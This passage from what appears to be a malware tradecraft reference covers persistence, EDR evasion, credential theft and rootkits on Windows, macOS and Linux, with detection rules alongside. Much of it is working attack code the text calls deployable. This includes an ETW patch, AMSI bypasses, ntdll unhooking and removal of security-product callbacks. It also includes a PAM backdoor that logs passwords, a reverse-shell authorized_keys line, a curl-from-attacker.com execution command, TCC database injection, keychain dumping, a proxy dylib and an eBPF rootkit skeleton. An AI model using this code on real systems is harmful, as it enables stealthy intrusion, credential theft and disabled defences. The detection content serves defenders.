**Gargoyle / timer-based execution.** The implant registers an APC or timer callback, marks its code region as non-executable, and sleeps. The timer fires, temporarily marks the region executable, runs the callback, and re-marks as non-executable. The code is only executable during the brief execution window.

**Detection.** Memory scanning during execution windows (trigger scans on timer/APC completion). Monitoring for `VirtualProtect` toggling `PAGE_EXECUTE_*` on the same region repeatedly. Defender's `AmsiStreamScan` for in-memory content.

---

## 2. macOS malware tradecraft

### 2.1 Persistence mechanisms — expanded

**LaunchDaemons** (`/Library/LaunchDaemons/`): plist files defining root-level services. Key plist keys: `ProgramArguments` (command), `RunAtLoad` (start on load), `KeepAlive` (restart on crash), `StartInterval` (periodic execution). Creating a LaunchDaemon requires root.

**LaunchAgents** (`/Library/LaunchAgents/` for all users, `~/Library/LaunchAgents/` for per-user): user-session services. Per-user agents don't require root — any malware running as the user can install one.

**Login Items.** Modern API: `SMLoginItemSetEnabled` registers a helper tool (bundled inside the main app) as a login item. Legacy: `LSSharedFileList` API adds items to the login items list. Sandboxed apps use `SMAppService.register`. These show up in System Settings → General → Login Items.

**Dylib hijacking.** macOS applications search for dylibs in a specific order: `@rpath` entries (from the binary's `LC_RPATH` load commands), then framework search paths. If an `@rpath`-specified dylib doesn't exist at the first search location, an attacker can place a malicious dylib there. The application loads the attacker's dylib instead of (or before) the legitimate one.

Enumeration:
```bash
# Find binaries with weak dylib references (missing dylibs in @rpath)
for app in /Applications/*.app/Contents/MacOS/*; do
  otool -l "$app" 2>/dev/null | grep -A2 LC_RPATH
  otool -L "$app" 2>/dev/null | grep @rpath
done

# dylib-hijack-scanner (automated tool)
python3 dylib_hijack_scan.py --scan /Applications/
```

**Dylib proxying.** The attacker places a malicious dylib at the hijack location. The malicious dylib re-exports all symbols from the original legitimate dylib (via `LC_REEXPORT_DYLIB` or an explicit re-export list). The application functions normally (all original APIs are available), but the attacker's `__attribute__((constructor))` function runs at load time.

```bash
# Create a proxy dylib
# In the malicious dylib's source:
# __attribute__((constructor)) void init() { /* payload */ }
# Link with: -Wl,-reexport_library,/path/to/original.dylib
```

**`DYLD_INSERT_LIBRARIES`.** Equivalent to Linux's `LD_PRELOAD`. Setting this environment variable causes `dyld` to load the specified dylib into every process launched with that environment. Restricted by SIP (System Integrity Protection) — processes with restricted entitlements (`__RESTRICT` segment, `CS_RESTRICT` flag, or `com.apple.security.cs.disable-library-validation = false`) ignore `DYLD_INSERT_LIBRARIES`. Does not work on Apple system binaries. Effective against third-party applications without `library-validation` entitlement.

**Other persistence mechanisms.** `emond` (event monitor — `/etc/emond.d/rules/`), `periodic` scripts (`/etc/periodic/daily/`), `at` jobs, XPC services (`/Library/PrivilegedHelperTools/`), Authorization Plugins (`/Library/Security/SecurityAgentPlugins/`), Directory Services plugins, Spotlight importers, Quick Look generators, Finder Sync extensions.

**Detection.**

| Source | Signal | Details |
|--------|--------|---------|
| ESF `ES_EVENT_TYPE_NOTIFY_CREATE` | New file in persistence locations | `/Library/LaunchDaemons/`, `/Library/LaunchAgents/`, `~/Library/LaunchAgents/` |
| `fs_usage` / endpoint telemetry | Dylib load from unexpected path | Application loading dylib from user-writable directory |
| `launchctl list` | Unknown service identifier | Service label not matching known system or application services |
| `KnockKnock` (Objective-See) | Persistence enumeration | Scans all known persistence locations and reports unsigned/anomalous items |
| Santa (Google) | Binary execution policy | Allow/deny binary execution based on certificate or hash |

### 2.2 TCC bypass — expanded

**TCC database locations.**
- User-level: `~/Library/Application Support/com.apple.TCC/TCC.db` (SQLite)
- System-level: `/Library/Application Support/com.apple.TCC/TCC.db` (requires FDA or SIP bypass)

**TCC database direct manipulation.** If the attacker has Full Disk Access (or a vulnerability granting write access to the TCC.db path), they can insert rows granting their application any TCC permission:
```sql
INSERT INTO access VALUES(
  'kTCCServiceAccessibility',  -- service
  'com.attacker.malware',      -- client (bundle ID)
  0,                           -- client_type (0 = bundle ID)
  2,                           -- auth_value (2 = allowed)
  3,                           -- auth_reason
  1,                           -- auth_version
  NULL, NULL, 0,               -- csreq, policy_id, indirect_object
  'UNUSED', NULL,
  0, strftime('%s','now')      -- last_modified
);
```

**Synthetic click / event injection.** Accessibility API (`AXUIElement`) allows programmatic UI interaction. An application with Accessibility permission can click TCC prompts, granting permissions to other applications. The attacker's malware first obtains Accessibility access (via social engineering or a prior TCC bypass), then uses it to approve subsequent TCC prompts silently.

**FDA abuse chains.** Terminal.app, iTerm2, and similar terminal emulators are often granted Full Disk Access by users. Any process launched from a terminal inherits its TCC permissions. An attacker who achieves code execution in a terminal session (via malicious shell profile, compromised brew package, or social engineering) inherits FDA without a separate TCC prompt.

**`osascript` / AppleScript intermediation.** AppleScript can trigger Automation TCC requests. A script sending `System Events` commands to click UI elements can approve TCC prompts. The intermediation chain: malware → `osascript` → System Events → click TCC prompt.

**Named CVEs.** CVE-2020-9934 (environment variable injection to redirect TCC database path), CVE-2021-30713 (synthetic click to bypass TCC), CVE-2021-30920 (SIP bypass leading to TCC.db write), CVE-2023-32364 (mount point TCC bypass), CVE-2024-44133 (Safari special entitlement TCC bypass — "HM Surf").

**Detection.** Monitor `TCC.db` modifications via ESF. Alert on `sqlite3` or `tccutil` accessing TCC databases. Monitor for `osascript` processes sending accessibility events to `SystemUIServer` or `UserNotificationCenter`.

### 2.3 Code signing, notarization, and XProtect

**Gatekeeper verification chain.** On first launch of a quarantined application: (1) verify code signature, (2) check notarization ticket (stapled or online OCSP check to `api.apple-cloudkit.com`), (3) check XProtect signature database (`/Library/Apple/System/Library/CoreServices/XProtect.bundle`), (4) if all pass, remove quarantine attribute and allow execution.

**XProtect.** Apple's built-in signature-based malware scanner. Rules are stored in `XProtect.bundle/Contents/Resources/XProtect.yara` (YARA rules) and `XProtect.plist` (hash/signature rules). XProtect updates are pushed via `softwareupdate` background process. XProtect Remediator (XProtect.app) runs periodic scans and can remove known malware.

**MRT (Malware Removal Tool).** Legacy removal tool, largely superseded by XProtect Remediator. Runs after macOS updates.

**Bypass techniques.** Removing quarantine attribute (`xattr -d com.apple.quarantine`). Archive formats: `.dmg` files created with `hdiutil` don't always propagate quarantine to contents. Malware distributed via `curl`, `wget`, or custom download code doesn't set quarantine. Abusing Apple-signed tools that don't check quarantine (e.g., specific versions of Safari WebKit loading plugins). Code-signing with a stolen or fraudulently-obtained Developer ID certificate (malware appears legitimately signed until Apple revokes the certificate).

**Detection.** Monitor for `xattr -d com.apple.quarantine`. Alert on execution of binaries without quarantine attribute that were recently downloaded (correlate network download with file creation). Monitor XProtect scan results in `/var/log/DiagnosticMessages/`.

### 2.4 Keychain extraction

The macOS keychain (`~/Library/Keychains/login.keychain-db`) stores passwords, certificates, and encryption keys. Extraction:
```bash
# Dump all keychain items (requires user password or session access)
security dump-keychain -d login.keychain-db
# Each item prompts for approval — attacker scripts can click "Allow Always"
# using Accessibility API if TCC Accessibility is granted

# Export specific items
security find-generic-password -a "account" -s "service" -w login.keychain-db
security find-internet-password -s "server" -w login.keychain-db
```

Tools: `keychaindump` (extracts master key from memory), `chainbreaker` (offline keychain parsing with known password or master key).

Detection: monitor `security` command-line usage. ESF `ES_EVENT_TYPE_NOTIFY_IOKIT_OPEN` on keychain files. Alert on bulk keychain access (many `find-*-password` calls in short succession).

### 2.5 Endpoint Security Framework evasion

**Deadline expiry.** ESF AUTH events (like `ES_EVENT_TYPE_AUTH_EXEC`) have a deadline — if the security tool doesn't respond within the deadline, the event is auto-allowed. A malware that generates many rapid AUTH events can overwhelm the security tool, causing deadline expiry and bypassing blocking decisions.

**Entitled process abuse.** Processes with specific Apple entitlements (e.g., `com.apple.private.security.clear-library-validation`) bypass ESF monitoring for certain event types. Hijacking an entitled process (via code injection into a first-party Apple tool) inherits these bypasses.

**User-approved MDM bypass.** If the ESF extension is deployed via MDM, removing the MDM profile (requires admin or social engineering) also removes the ESF extension, eliminating endpoint security entirely.

---

## 3. Linux malware tradecraft

### 3.1 Persistence mechanisms — expanded

**systemd services.** A malicious `.service` file:
```ini
# /etc/systemd/system/update-helper.service
[Unit]
Description=System Update Helper
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/.update-helper
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
```
```bash
systemctl daemon-reload && systemctl enable --now update-helper.service
```

Detection: `inotifywait` on `/etc/systemd/system/` and `/usr/lib/systemd/system/`. `systemctl list-unit-files --state=enabled` and diff against baseline. Auditd rule: `-w /etc/systemd/system/ -p wa -k systemd_persistence`.

**systemd timers.** Alternative to cron, less frequently monitored:
```ini
# /etc/systemd/system/update-helper.timer
[Timer]
OnBootSec=5min
OnUnitActiveSec=1h
[Install]
WantedBy=timers.target
```

**PAM backdoor module.** Beyond `pam_exec`, an attacker can compile a custom PAM module:
```c
// pam_backdoor.so
#include <security/pam_modules.h>
PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *user; const char *password;
    pam_get_item(pamh, PAM_USER, (const void **)&user);
    pam_get_item(pamh, PAM_AUTHTOK, (const void **)&password);
    // Log or exfiltrate user:password
    FILE *f = fopen("/tmp/.auth.log", "a");
    fprintf(f, "%s:%s\n", user, password); fclose(f);
    return PAM_SUCCESS; // always succeed = backdoor auth
}
```
Installed in `/etc/pam.d/common-auth` as `auth sufficient pam_backdoor.so`. Any password authenticates.

Detection: file-integrity monitoring on `/lib/security/`, `/lib64/security/`, and `/etc/pam.d/`. Auditd: `-w /etc/pam.d/ -p wa -k pam_config`.

**SSH authorized_keys injection.** Beyond `AuthorizedKeysCommand`, attackers add keys to `~/.ssh/authorized_keys` with a `command=` prefix that runs a reverse shell on connection while still allowing normal shell access:
```
command="/bin/bash -c '/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1 & exec /bin/bash -l'" ssh-rsa AAAA...
```

### 3.2 Fileless execution

**`memfd_create`.** Creates an anonymous file in memory (backed by RAM, no filesystem path). The attacker writes an ELF binary to the memfd, then executes it via `/proc/self/fd/<N>`:
```c
int fd = memfd_create("", MFD_CLOEXEC);
write(fd, elf_buffer, elf_size);
char path[64];
snprintf(path, sizeof(path), "/proc/self/fd/%d", fd);
execve(path, argv, envp);
```

The binary never touches disk. `/proc/PID/exe` shows `[memfd: (deleted)]` or `/memfd:`.

Detection: auditd rule for `memfd_create` syscall: `-a always,exit -F arch=b64 -S memfd_create -k fileless`. `execve` from `/proc/self/fd/` or `/memfd:` paths. Falco rule:
```yaml
- rule: Fileless Execution via memfd_create
  desc: Detect execution of binaries from memory file descriptors
  condition: >
    spawned_process and (proc.exe contains "/memfd:" or proc.exe contains "(deleted)")
  output: "Fileless execution detected (user=%user.name command=%proc.cmdline exe=%proc.exe)"
  priority: CRITICAL
```

**`/dev/shm` execution.** `/dev/shm` is a `tmpfs` mounted in RAM. Writing an executable to `/dev/shm` and executing it avoids disk I/O on systems where `/tmp` is on disk. Some hardened systems mount `/dev/shm` with `noexec` — bypassed by using a loader (`ld-linux.so /dev/shm/payload`) or by `memfd_create` copy.

**`dd` from `/proc/self/fd`.** Pipe a binary from a remote source directly into execution:
```bash
curl -s http://attacker.com/payload | dd of=/proc/self/fd/3 bs=1M 2>/dev/null; /proc/self/fd/3
```

### 3.3 Process injection on Linux

**`ptrace` injection.** `ptrace(PTRACE_ATTACH, target_pid)` → `ptrace(PTRACE_POKETEXT, ...)` writes shellcode into the target's address space → `ptrace(PTRACE_SETREGS, ...)` redirects execution to the shellcode → `ptrace(PTRACE_DETACH, ...)`.

Requirements: the attacker must own the target process (same UID) or be root. `kernel.yama.ptrace_scope = 1` (default on Ubuntu/Debian) restricts ptrace to parent-child relationships only. `ptrace_scope = 3` disables ptrace entirely.

```bash
# Check ptrace scope
cat /proc/sys/kernel/yama/ptrace_scope
# 0 = any process (classic), 1 = parent only, 2 = admin only, 3 = disabled
```

**`/proc/PID/mem` injection.** Open `/proc/<target>/mem`, seek to an executable region (found via `/proc/<target>/maps`), and write shellcode:
```c
int fd = open("/proc/TARGET/mem", O_RDWR);
lseek(fd, executable_region_addr, SEEK_SET);
write(fd, shellcode, shellcode_len);
close(fd);
// Trigger execution: send signal, modify instruction pointer via ptrace, etc.
```

Same ptrace_scope restrictions apply (requires same UID or root).

**`process_vm_writev`.** Syscall for cross-process memory write without ptrace attachment. Requires same UID or `CAP_SYS_PTRACE`. Stealthier than ptrace (no SIGSTOP, no PTRACE_ATTACH event).

Detection: auditd rule for ptrace: `-a always,exit -F arch=b64 -S ptrace -k process_injection`. Monitor `/proc/PID/mem` opens with write intent. Falco rule for ptrace attachment to non-child processes.

### 3.4 Specific rootkit tools

**Diamorphine.** Kernel module rootkit. Features: hide files/directories (prefix with configurable magic string), hide processes (send signal 31 to PID), escalate to root (send signal 64 to any process), hide the module from `lsmod` (removes from `THIS_MODULE->list`). Hooks `getdents64` (file hiding), `kill` (signal-based commands), and `getdents` (32-bit compat).

```bash
# Load
insmod diamorphine.ko
# Hide a process
kill -31 <pid>
# Get root shell
kill -64 $$
# Unhide module (toggle)
kill -63 0
```

Detection: `kill -63 0` from any non-root user is anomalous. Module-signing enforcement prevents loading. Kernel integrity tools (`LKRG` — Linux Kernel Runtime Guard) detect syscall-table modifications. Memory forensics: `volatility3` with Linux profile can enumerate hidden modules.

**Reptile.** Kernel module rootkit with more features: magic packet trigger (specific network packet activates a reverse shell), port knocking, hidden backdoor shell, file/process/network hiding, persistent across reboots (installs itself in module load path). Uses `kmatryoshka` for loader obfuscation.

Detection: network monitoring for magic packets (specific payload patterns). `bpftool` for any BPF programs installed by Reptile. File-integrity monitoring on module directories.

**TripleCross.** eBPF-based rootkit. Uses eBPF programs attached to tracepoints and kprobes to: hide files (hook `getdents64` return), hide processes (filter `/proc` reads), intercept and log credentials from `read`/`write` syscalls on TTY file descriptors, establish a backdoor triggered by network packets (XDP program), and perform library injection by hooking `execve` and modifying the environment.

```bash
# Load TripleCross components
./tc -t backdoor --lport 443 --lhost 10.0.0.1
./tc -t hide --pid 1234
./tc -t hide --file /tmp/.malware
```

Detection: `bpftool prog list` reveals eBPF programs attached to unusual tracepoints. `bpftool prog dump xlated id <N>` shows bytecode for analysis. Alert on `bpf()` syscall with `BPF_PROG_LOAD` from non-standard processes.

### 3.5 Auditd evasion

**Auditd bypass techniques.**

| Technique | Method | Detection |
|-----------|--------|-----------|
| Kill `auditd` | `kill -9 $(pidof auditd)` | Monitored by systemd — restarts. Use `auditctl -e 0` (disable) or `auditctl -D` (delete all rules) instead |
| `auditctl -e 0` | Disables audit system entirely (requires `CAP_AUDIT_CONTROL` / root) | Monitor for the command. Use `auditctl -e 2` (immutable mode — rules cannot be modified until reboot) |
| `auditctl -D` | Deletes all audit rules | Same as above |
| Immutable bypass | If rules are not in immutable mode (`-e 2`), they can be silently modified | Always deploy with `-e 2` at the end of the rule set |
| Netlink flooding | Flood the audit netlink socket to overflow the backlog queue (`audit_backlog_limit`). Excess events are dropped | Increase `backlog_limit` (default 8192 → 65536). Monitor `audit: backlog limit exceeded` in kernel log |
| Direct syscalls | Some audit rules are process-name-based (`-F exe=`). If the attacker's binary doesn't match the filter, the rule doesn't trigger | Write rules on syscall numbers (`-S`), not process names |

**Hardening auditd.**
```bash
# Make audit rules immutable until reboot (must be LAST rule)
auditctl -e 2

# Increase backlog to prevent flooding
auditctl -b 65536

# Key persistence/injection monitoring rules
-a always,exit -F arch=b64 -S execve -k exec_monitor
-a always,exit -F arch=b64 -S ptrace -k injection
-a always,exit -F arch=b64 -S memfd_create -k fileless
-a always,exit -F arch=b64 -S init_module,finit_module -k kernel_module
-a always,exit -F arch=b64 -S bpf -k ebpf_load
-w /etc/systemd/system/ -p wa -k systemd_persistence
-w /etc/cron.d/ -p wa -k cron_persistence
-w /etc/pam.d/ -p wa -k pam_config
-w /etc/ssh/sshd_config -p wa -k ssh_config
-w /root/.ssh/authorized_keys -p wa -k ssh_keys
```

### 3.6 Container escape → host persistence

A containerized attacker who escapes (via CVE-2024-21626 `runc` WORKDIR, `--privileged` container, mounted Docker socket, kernel exploit) gains host-level access and can install any persistence mechanism from §3.1.

**Common escape-to-persistence chains.**

| Escape Vector | Host Access | Persistence |
|--------------|-------------|-------------|
| Mounted Docker socket (`/var/run/docker.sock`) | Create privileged container, `chroot` to host filesystem | Write systemd service, cron job, SSH key |
| `--privileged` + `nsenter` | `nsenter -t 1 -m -u -i -n -p -- /bin/bash` → host root shell | Any host persistence mechanism |
| Kernel exploit | Direct host kernel access | Kernel module rootkit, eBPF rootkit |
| Writable hostPath mount | Write to mounted host directory | If mount includes `/etc/`, write cron/systemd/PAM files |

### 3.7 Detection frameworks

**osquery queries for persistence detection:**
```sql
-- Suspicious systemd services
SELECT name, source, status FROM systemd_units
WHERE source NOT LIKE '/usr/lib/systemd/%' AND source NOT LIKE '/lib/systemd/%';

-- Unauthorized SSH keys
SELECT * FROM authorized_keys WHERE key NOT IN (SELECT key FROM baseline_keys);

-- Loaded kernel modules not in baseline
SELECT name FROM kernel_modules WHERE name NOT IN ('baseline_module_list');

-- eBPF programs
SELECT id, type, attached_probes, name FROM bpf_process_events;

-- memfd processes
SELECT pid, name, path FROM processes WHERE path LIKE '%memfd%' OR path LIKE '%deleted%';
```

**Falco rules for runtime detection:**
```yaml
- rule: Kernel Module Loaded
  condition: >
    evt.type in (init_module, finit_module) and not trusted_module_names
  output: "Kernel module loaded (user=%user.name module=%evt.arg.name)"
  priority: WARNING

- rule: Ptrace Attached to Non-Child
  condition: >
    evt.type = ptrace and evt.arg.request = PTRACE_ATTACH
  output: "Ptrace attach detected (user=%user.name target=%evt.arg.pid)"
  priority: CRITICAL

- rule: PAM Configuration Modified
  condition: >
    open_write and fd.name startswith /etc/pam.d/
  output: "PAM config modified (user=%user.name file=%fd.name)"
  priority: CRITICAL
```

---

## 3A. Windows EDR Evasion — Code

### 3A.1 ETW patching — C implementation

Compilable C that patches `EtwEventWrite` in the current process. The pseudocode in §1.4 describes the mechanism; this is the deployable form.

```c
#include <windows.h>
BOOL PatchEtwEventWrite(void) {
    HMODULE h = GetModuleHandleA("ntdll.dll"); if (!h) return FALSE;
    FARPROC p = GetProcAddress(h, "EtwEventWrite"); if (!p) return FALSE;
    unsigned char patch[] = {0x33,0xC0,0xC3}; // xor eax,eax; ret (STATUS_SUCCESS)
    DWORD old = 0;
    if (!VirtualProtect((LPVOID)p, sizeof(patch), PAGE_EXECUTE_READWRITE, &old))
        return FALSE;
    memcpy((void*)p, patch, sizeof(patch));
    VirtualProtect((LPVOID)p, sizeof(patch), old, &old);
    return TRUE;
}
```

Detection note: the `VirtualProtect` call on ntdll's `.text` range fires ETW `Microsoft-Windows-Kernel-Audit-API-Calls` (if ETW is still intact at the kernel level) and the Threat Intelligence ETW provider. Post-patch, user-mode ETW is blind — kernel-side telemetry is the only remaining signal.

### 3A.2 AMSI bypass — PowerShell reflection and C# patch

**PowerShell** — obfuscated `amsiInitFailed` set (string-split defeats static signatures; see §1.5 for unobfuscated form):

```powershell
$a=[Ref].Assembly.GetType(('System.Manage'+'ment.Autom'+'ation.Amsi'+'Utils'))
$a.GetField(('amsiInit'+'Failed'),'NonPublic,Static').SetValue($null,$true)
```

**C#** — patch `AmsiScanBuffer` to return `E_INVALIDARG` (0x80070057) via P/Invoke, causing scan failure → allow:

```csharp
using System; using System.Runtime.InteropServices;
public class AmsiBypass {
    [DllImport("kernel32")] static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport("kernel32")] static extern IntPtr LoadLibraryA(string n);
    [DllImport("kernel32")] static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);

    public static void Patch() {
        var p = GetProcAddress(LoadLibraryA("amsi.dll"), "AmsiScanBuffer");
        byte[] patch = {0xB8,0x57,0x00,0x07,0x80,0xC3}; // mov eax,E_INVALIDARG; ret
        VirtualProtect(p, (UIntPtr)patch.Length, 0x40, out uint old);
        Marshal.Copy(patch, 0, p, patch.Length);
        VirtualProtect(p, (UIntPtr)patch.Length, old, out _);
    }
}
```

### 3A.3 Direct syscall stub — x64 assembly

MASM-syntax stub for `NtAllocateVirtualMemory`. The SSN (System Service Number) varies across Windows builds and must be resolved at runtime.

```asm
; x64 direct syscall stub — NtAllocateVirtualMemory
; SSN is patched at runtime by the resolver (see Halo's Gate below)
.code

NtAllocateVirtualMemory PROC
    mov r10, rcx            ; first arg → r10 (Windows x64 syscall convention)
    mov eax, 0FFFFh         ; placeholder SSN — patched at runtime
    syscall
    ret
NtAllocateVirtualMemory ENDP

END
```

**SSN resolution via Halo's Gate (C).** If the target stub is hooked, scan neighbors (stubs are 0x20 bytes apart in ntdll) until an unhooked one is found, then derive the target SSN by offset.

```c
#include <windows.h>
#define STUB_SIZE 0x20
#define IS_UNHOOKED(p) ((*(PULONG)(p) == 0xB8D18B4C) && (*((PBYTE)(p)+6) == 0x00))

BOOL HalosGateResolve(PVOID pStubBase, PDWORD pSSN) {
    PBYTE pStub = (PBYTE)pStubBase;
    if (IS_UNHOOKED(pStub)) { *pSSN = *(PWORD)(pStub + 4); return TRUE; }
    // Stub is hooked — scan neighbors (stubs are 0x20 apart in ntdll)
    for (int i = 1; i < 500; i++) {
        PBYTE down = pStub + (i * STUB_SIZE);
        if (IS_UNHOOKED(down)) { *pSSN = *(PWORD)(down + 4) - i; return TRUE; }
        PBYTE up = pStub - (i * STUB_SIZE);
        if (IS_UNHOOKED(up)) { *pSSN = *(PWORD)(up + 4) + i; return TRUE; }
    }
    return FALSE;
}
```

### 3A.4 Unhooking ntdll — C implementation

Compilable form of §1.2 pseudocode: maps clean ntdll from `KnownDlls`, parses PE headers, overwrites hooked `.text`.

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS(NTAPI *pNtOpenSection)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);
typedef NTSTATUS(NTAPI *pNtMapView)(HANDLE,HANDLE,PVOID*,ULONG_PTR,SIZE_T,PLARGE_INTEGER,PSIZE_T,DWORD,ULONG,ULONG);
typedef NTSTATUS(NTAPI *pNtUnmapView)(HANDLE, PVOID);

BOOL UnhookNtdll(void) {
    HMODULE h = GetModuleHandleA("ntdll.dll"); if (!h) return FALSE;
    pNtOpenSection  Open  = (pNtOpenSection)GetProcAddress(h,"NtOpenSection");
    pNtMapView      Map   = (pNtMapView)GetProcAddress(h,"NtMapViewOfSection");
    pNtUnmapView    Unmap = (pNtUnmapView)GetProcAddress(h,"NtUnmapViewOfSection");

    UNICODE_STRING name; RtlInitUnicodeString(&name, L"\\KnownDlls\\ntdll.dll");
    OBJECT_ATTRIBUTES oa = {sizeof(oa),NULL,&name,0,NULL,NULL};
    HANDLE sec = NULL; if (Open(&sec, SECTION_MAP_READ, &oa)) return FALSE;
    PVOID clean = NULL; SIZE_T sz = 0;
    if (Map(sec,GetCurrentProcess(),&clean,0,0,NULL,&sz,1,0,PAGE_READONLY))
        { CloseHandle(sec); return FALSE; }

    // Walk PE sections to find .text
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)h+((PIMAGE_DOS_HEADER)h)->e_lfanew);
    PIMAGE_SECTION_HEADER s = IMAGE_FIRST_SECTION(nt);
    for (WORD i=0; i<nt->FileHeader.NumberOfSections; i++) {
        if (!memcmp(s[i].Name,".text",5)) {
            PVOID dst=(PBYTE)h+s[i].VirtualAddress, src=(PBYTE)clean+s[i].VirtualAddress;
            DWORD tsz=s[i].Misc.VirtualSize, old;
            VirtualProtect(dst,tsz,PAGE_EXECUTE_READWRITE,&old);
            memcpy(dst,src,tsz);
            VirtualProtect(dst,tsz,old,&old);
            break;
        }
    }
    Unmap(GetCurrentProcess(),clean); CloseHandle(sec); return TRUE;
}
```

### 3A.5 Callback enumeration — PspNotifyRoutines walk

Kernel notification callbacks are stored in arrays (`PspCreateProcessNotifyRoutine`, `PspCreateThreadNotifyRoutine`, `PspLoadImageNotifyRoutine` — each up to 64 entries). Requires a vulnerable/custom driver for kernel read.

```c
// Kernel-mode enumeration (driver context):
// Each array entry is an EX_CALLBACK_ROUTINE_BLOCK pointer (low 4 bits are flags).
PVOID *PspCreateProcessNotifyRoutine; // located via pattern scan or symbol offset

for (int i = 0; i < 64; i++) {
    PVOID entry = PspCreateProcessNotifyRoutine[i];
    if (entry == NULL) continue;
    // Mask low bits, dereference to get callback function pointer
    PVOID callback = *(PVOID *)((ULONG_PTR)(entry & ~0xF) + 0x8);
    // If callback address falls within EDR driver range → zero the slot to disable
    if (IsInModuleRange(callback, "CrowdStrike.sys"))
        PspCreateProcessNotifyRoutine[i] = NULL;
}
```

Detection: monitor for loading of known BYOVD (Bring Your Own Vulnerable Driver) tools: `dbutil_2_3.sys`, `RTCore64.sys`, `gdrv.sys`, `iqvw64e.sys`. HVCI blocks unsigned drivers. Keep the Vulnerable Driver Blocklist (`DriverSiPolicy.p7b`) current.

### 3A.6 Sleep obfuscation — Ekko / Foliage technique

Ekko chains `RtlCreateTimer` callbacks that use `NtContinue` to pivot RIP through legitimate API functions, encrypting the implant's memory during sleep:

```
RtlCreateTimerQueue → NtCreateEvent → chain 6 timers:
  T1: NtContinue → VirtualProtect (implant region → PAGE_READWRITE)
  T2: NtContinue → SystemFunction032 (RC4-encrypt implant memory)
  T3: NtContinue → WaitForSingleObject (sleep for beacon interval)
  T4: NtContinue → SystemFunction032 (RC4-decrypt)
  T5: NtContinue → VirtualProtect (restore PAGE_EXECUTE_READ)
  T6: NtContinue → SetEvent (signal completion)
→ WaitForSingleObject blocks until T6 fires → implant resumes
```

During sleep: code is encrypted + non-executable (defeats memory scanning), call stack shows clean `NtWaitForSingleObject` chain, timers execute via thread pool (no suspicious threads). Foliage variant uses `NtQueueApcThread` instead of `RtlCreateTimer` for APC-based sleep on the current thread.

Detection: `RtlCreateTimerQueue` + `SystemFunction032` co-occurrence. Periodic heap scan for high-entropy `PAGE_READWRITE` regions adjacent to `PAGE_EXECUTE_READ`. Timer callback analysis for `VirtualProtect` ↔ `SystemFunction032` sequences.

---

## 3B. macOS Evasion — Code

### 3B.1 TCC bypass — direct database manipulation

Requires SIP-off or prior SIP bypass. Python — insert TCC permission grant:

```python
import sqlite3, os, time
tcc_db = os.path.expanduser("~/Library/Application Support/com.apple.TCC/TCC.db")
conn = sqlite3.connect(tcc_db)
conn.execute("""INSERT OR REPLACE INTO access
    (service,client,client_type,auth_value,auth_reason,auth_version,
     csreq,policy_id,indirect_object_identifier,indirect_object_identifier_type,
     indirect_object_code_identity,flags,last_modified)
    VALUES ('kTCCServiceAccessibility','com.attacker.implant',0,2,3,1,
            NULL,NULL,'UNUSED',0,NULL,0,?)""", (int(time.time()),))
conn.commit(); conn.close()
```

**Swift equivalent** uses `SQLite3` framework with identical SQL — same INSERT into `access` table with `kTCCServiceSystemPolicyAllFiles` for FDA, or any `kTCCService*` constant. The Python example above applies to both languages with trivial adaptation.

Detection: ESF `ES_EVENT_TYPE_NOTIFY_OPEN` and `ES_EVENT_TYPE_NOTIFY_WRITE` on `*/com.apple.TCC/TCC.db`. Alert on any non-`tccd` process accessing TCC databases.

### 3B.2 Endpoint Security Framework evasion

**Process argument spoofing.** Launch suspended, rewrite `_NSGetArgv` before ESF reads — recorded args differ from execution (cf. Windows §1.6).

**Client subscription racing.** LaunchDaemon with `RunAtLoad` executes before ES clients initialize (blind window). Label mimics Apple services (e.g., `com.apple.systemstats.analysis`).

### 3B.3 Dylib proxying — complete template

Proxy forwards original exports via `-reexport_library`, runs payload at load via `__attribute__((constructor))`.

```c
// malicious_proxy.c — clang -dynamiclib -Wl,-reexport_library,/path/to/original.dylib
#include <stdio.h>
#include <unistd.h>

__attribute__((constructor)) static void implant_init(void) {
    // Payload runs at dylib load time, before main()
    if (fork() == 0) { setsid(); /* long-running payload */ _exit(0); }
}
// All original exports forwarded via -reexport_library — no manual re-exports needed.
```

Deploy: `otool -L Target.app/Contents/MacOS/Target | grep @rpath` to identify the hijackable path, build with `clang -dynamiclib -Wl,-reexport_library,/path/to/original.dylib`, place at the first `@rpath` search location (must be writable).

### 3B.4 Persistence — LaunchAgent and SMAppService

**LaunchAgent plist** — per-user agent (no root required), `RunAtLoad` + `KeepAlive`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
    <key>Label</key><string>com.user.synchelper</string>
    <key>ProgramArguments</key><array><string>/Users/Shared/.sync/helper</string></array>
    <key>RunAtLoad</key><true/>
    <key>KeepAlive</key><true/>
    <key>StandardOutPath</key><string>/dev/null</string>
    <key>StandardErrorPath</key><string>/dev/null</string>
</dict></plist>
```

Install: `cp *.plist ~/Library/LaunchAgents/ && launchctl load ~/Library/LaunchAgents/com.user.synchelper.plist`

**Login Items (macOS 13+):** `SMAppService.loginItem(identifier:).register()` — helper must be bundled in `Contents/Library/LoginItems/`. Appears in System Settings → General → Login Items. Detection: `sfltool dumpbtm` enumerates all registered items.

---

## 3C. Linux Evasion — Code

### 3C.1 eBPF rootkit skeleton — process hiding

Hooks `getdents64` return to modify directory entries, hiding PIDs from `/proc`. Requires `CAP_BPF` + `CAP_PERFMON` (or root).

```c
// hide_proc.bpf.c — libbpf/CO-RE skeleton
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>

struct { __uint(type, BPF_MAP_TYPE_HASH); __uint(max_entries, 64);
         __type(key, u32); __type(value, u8); } hidden_pids SEC(".maps");

SEC("tp/syscalls/sys_exit_getdents64")
int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx) {
    if (ctx->ret <= 0) return 0;
    // Iterate linux_dirent64 buffer via bpf_probe_read_user.
    // For each d_name matching a PID in hidden_pids map:
